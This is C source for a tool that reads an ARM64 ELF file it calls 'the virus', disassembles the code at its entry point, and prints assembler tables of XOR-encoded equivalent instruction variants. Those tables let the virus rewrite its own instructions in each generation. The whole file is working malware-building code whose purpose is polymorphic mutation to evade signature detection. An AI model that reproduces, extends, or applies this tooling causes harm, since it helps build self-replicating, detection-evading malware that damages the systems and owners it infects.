#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <elf.h>
#include <time.h>

#include <capstone/capstone.h>
#include <keystone/keystone.h>

#define EOR_EVOLUTION_MAX_IDX    9

struct virus_file {
    union {
        Elf64_Ehdr *elf;
        uint8_t *raw;
    } file;
    size_t size;
};


int open_virus(const char *path, struct virus_file *virus)
{
    int fd;
    struct stat virus_stat;
    void *ret = NULL;

    if ((fd = open(path, O_RDONLY)) == -1) {
        fprintf(stderr, "open: %s\n", strerror(errno));
        return -1;
    }

    memset(&virus_stat, 0, sizeof(struct stat));

    if (fstat(fd, &virus_stat) == -1) {
        fprintf(stderr, "stat: %s\n", strerror(errno));
        close(fd);
        return -1;
    }

    ret = mmap(NULL, virus_stat.st_size, PROT_READ, MAP_PRIVATE, fd, 0);

    close(fd);

    if (ret == MAP_FAILED) {
        fprintf(stderr, "mmap: %s\n", strerror(errno));
        return -1;
    }

    virus->file.elf = ret;
    virus->size = virus_stat.st_size;

    return 0;
}

uint32_t *get_insts(struct virus_file *virus)
{
    if (!virus) return NULL;
    if (!virus->file.raw) return NULL;

    Elf64_Half i;
    Elf64_Phdr *elf_end = (Elf64_Phdr *)virus->file.raw + virus->size;
    Elf64_Phdr *phdrs = (Elf64_Phdr *)(virus->file.raw + virus->file.elf->e_phoff);

    for (i=0; i < virus->file.elf->e_phnum; i++, phdrs++) {
        if (phdrs >= elf_end)
            return NULL;
        if (phdrs->p_flags & PF_X) {
            if (virus->file.elf->e_entry < phdrs->p_vaddr) return NULL;
            uint8_t *ret = virus->file.raw + phdrs->p_offset
                    + (virus->file.elf->e_entry - phdrs->p_vaddr);
            if (ret >= (uint8_t *)elf_end)
                return NULL;
            return (uint32_t *)ret;
        }
    }
    return NULL;
}

uint32_t keystone_assemble(char *instr)
{
    if (!instr) return 0;

    ks_engine *ks;
    ks_err err;
    size_t count, size;
    uint8_t *encode;
    uint32_t ret;

    
    if (ks_open(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN, &ks) != KS_ERR_OK) {
        fprintf(stderr, "ks_open: fail\n");
        return 0;
    }

    if (ks_asm(ks, instr, 0, &encode, &size, &count) != KS_ERR_OK) {
        fprintf(stderr, "ks_asm: fail: %s\n", instr);
        return 0;
    }
    ret = *(uint32_t *)encode;
    ks_free(encode);
    ks_close(ks);
    return ret;
}

void eor_build_tbl(const char *dest_operand, uint32_t first_inst, int idx)
{
    if (!dest_operand) return;

    int i;
    char inst[32];
    char reg_type = *dest_operand;
    uint32_t next_inst, saved_first = first_inst;

    printf("\t.short %d\n", idx);
    printf("\t.byte 0x%02x\n", EOR_EVOLUTION_MAX_IDX);
    printf("\t.byte 0x01\n");
    for (i=0; i<EOR_EVOLUTION_MAX_IDX; i++) {
        uint32_t random_int = rand()%30;
        if (random_int == 28) {
            snprintf(inst, 32, "mov %s, %czr", dest_operand, reg_type);
        } else {
            snprintf(inst, 32, "eor %s, %c%d, %c%d", dest_operand,
                                 reg_type,
                                 random_int,
                                 reg_type,
                                 random_int);
        }
        next_inst = keystone_assemble(inst);
        //printf("%s %08x\n", inst, next_inst);
        printf("\t.int 0x%08x\n", first_inst ^ next_inst);
        first_inst = next_inst;
    }
    printf("\t.int 0x%08x\n", first_inst ^ saved_first);
}

void add_build_tbl(const char *op0, const char *op1, const char *op2, uint32_t first_inst, int idx)
{
    if (!op0 || !op1 || !op2) return;

    int i;
    char inst[32];
    uint32_t next_inst;

    printf("\t.short %d\n", idx);
    printf("\t.byte 0x00\n");
    printf("\t.byte 0x01\n");

    snprintf(inst, 32, "add %s, %s, %s", op0, op2, op1);
    next_inst = keystone_assemble(inst);
    //printf("%s\n", inst);
    printf("\t.int 0x%08x\n", first_inst ^ next_inst);
}

void disas_virus(uint32_t *virus_instructions)
{
    csh handle;
    cs_insn *instr;
    size_t count;
    char instr_tmp[32],
         *operand0, *operand1, *operand2;

    if (cs_open(CS_ARCH_ARM64, CS_MODE_ARM, &handle) != CS_ERR_OK) {
        fprintf(stderr, "cs_open: failed\n");
        return;
    }

    count = cs_disasm(handle, (char *)virus_instructions, 1000000, 0x1000, 0, &instr);

    if (count > 0) {
        size_t j;
        for (j=0; j < count; j++) {
            if (j == 3) {
                printf("\t.short %d\n", j);
                printf("\t.byte 0x01\n");
                printf("\t.byte 0x02\n");
                printf("\t.int 0x000000c1\n");
                printf("\t.int 0x000000c1\n");
                printf("\t.int 0x00000000\n");
                printf("\t.int 0x00000000\n");
                j++;
            } else if (j == 102) {
                printf("\t.short %d\n", j);
                printf("\t.byte 0x02\n");
                printf("\t.byte 0x03\n");
                printf("\t.int 0x00000c08\n");
                printf("\t.int 0x00002401\n");
                printf("\t.int 0x00002809\n");

                printf("\t.int 0x00002809\n");
                printf("\t.int 0x00000c08\n");
                printf("\t.int 0x00002401\n");

                printf("\t.int 0x00002401\n");
                printf("\t.int 0x00002809\n");
                printf("\t.int 0x00000c08\n");
                j += 2;
            } else if (j == 108) {
                printf("\t.short %d\n", j);
                printf("\t.byte 0x01\n");
                printf("\t.byte 0x02\n");
                printf("\t.int 0x00000c08\n");
                printf("\t.int 0x00000c08\n");
                printf("\t.int 0x00000000\n");
                printf("\t.int 0x00000000\n");
                j++;
            } else if (j == 168) {
                printf("\t.short %d\n", j);
                printf("\t.byte 0x02\n");
                printf("\t.byte 0x02\n");
                printf("\t.int 0x00000000\n");
                printf("\t.int 0x00000000\n");
                printf("\t.int 0x00003be3\n");
                printf("\t.int 0x00003be3\n");
                printf("\t.int 0x00000000\n");
                printf("\t.int 0x00000000\n");
                j++;
            } else if (j == 188) {

                printf("\t.short %d\n", j);
                printf("\t.byte 0x00\n");
                printf("\t.byte 0x02\n");
                printf("\t.int 0x00001c07\n");
                printf("\t.int 0x00001c07\n");
                j++;
            } else if (j == 352) {
                printf("\t.short %d\n", j);
                printf("\t.byte 0x01\n");
                printf("\t.byte 0x02\n");
                printf("\t.int 0x00000000\n");
                printf("\t.int 0x00000000\n");
                printf("\t.int 0x00000401\n");
                printf("\t.int 0x00000401\n");
                j++;
            } else if (j == 476) {
                printf("\t.short %d\n", j);
                printf("\t.byte 0x02\n");
                printf("\t.byte 0x02\n");
                printf("\t.int 0x00000000\n");
                printf("\t.int 0x00000000\n");
                printf("\t.int 0x00000000\n");
                printf("\t.int 0x00000000\n");
                printf("\t.int 0x0000040e\n");
                printf("\t.int 0x0000040e\n");
                j++;
            } else if (j == 514) {
                printf("\t.short %d\n", j);
                printf("\t.byte 0x02\n");
                printf("\t.byte 0x02\n");
                printf("\t.int 0x00000809\n");
                printf("\t.int 0x00000809\n");
                printf("\t.int 0x00000000\n");
                printf("\t.int 0x00000000\n");
                printf("\t.int 0x00000000\n");
                printf("\t.int 0x00000000\n");
                j++;
            } else if (j == 522) {
                printf("\t.short %d\n", j);
                printf("\t.byte 0x00\n");
                printf("\t.byte 0x02\n");
                printf("\t.int 0x0000408\n");
                printf("\t.int 0x0000408\n");
                j++;
            } else if (!strcmp(instr[j].mnemonic, "eor")) {
                strcpy(instr_tmp, instr[j].op_str);
                operand0 = strtok(instr_tmp, ",");
                if (operand0) {
                    operand1 = strtok(NULL, ",");
                    operand2 = strtok(NULL, ",");
                    if (operand1 && operand2) {
                        if (!strcmp(operand1, operand2))
                            eor_build_tbl(operand0, virus_instructions[j], j);
                    }
                }
            } else if (!strcmp(instr[j].mnemonic, "add")) {
                strcpy(instr_tmp, instr[j].op_str);
                operand0 = strtok(instr_tmp, ",");
                if (operand0) {
                    operand1 = strtok(NULL, ",");
                    operand2 = strtok(NULL, ",");
                    if (operand1 && operand2) {
                        switch(operand2[1]) {
                        case 'w':
                        case 'x':
                            if (operand1[1] != 's')
                                add_build_tbl(operand0, operand1+1, operand2+1,
                                                virus_instructions[j], j);
                        }
                    }
                }
            } else if (!strcmp(instr[j].mnemonic, "ldr")) {
                continue;
                if (!strcmp(instr[j+1].mnemonic, "ldr")) {
                printf("%d: %s %s 0x%08x\n", j, instr[j].mnemonic, instr[j].op_str,
                                 virus_instructions[j]);
                printf("%d: %s %s 0x%08x\n", j+1, instr[j+1].mnemonic, instr[j+1].op_str,
                                 virus_instructions[j+1]);
                }
            } else if (!strcmp(instr[j].mnemonic, "udf")) {
                // Some keystone configs will not count words that
                // failed to disassemble, others will. This hack
                // remedies the latter case
                j--;
                break;
            }
        }
        printf("\t.short %d\n", j);
        printf("\t.byte 0x04\n");
        printf("\t.byte 0x01\n");
        printf("\t.int 0x1c0c0d1e\n");
        printf("\t.int 0x69060f04\n");
        printf("\t.int 0x6a060f03\n");
        printf("\t.int 0x6a170e1a\n");
        printf("\t.int 0x751b0303\n");
    }
    cs_free(instr, count);
    cs_close(&handle);
}

int main(int argc, char **argv)
{
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <path/to/virus>\n", argv[0]);
        return 1;
    }

    struct virus_file virus;
    uint32_t *instrs;

    if (open_virus(argv[1], &virus)) {
        fprintf(stderr, "[!] Failed to open the virus\n");
        return 1;
    }

    instrs = get_insts(&virus);
    time_t t = time(NULL);
    srand(t);

    disas_virus(instrs);
    munmap(virus.file.elf, virus.size);
    return 0;
}
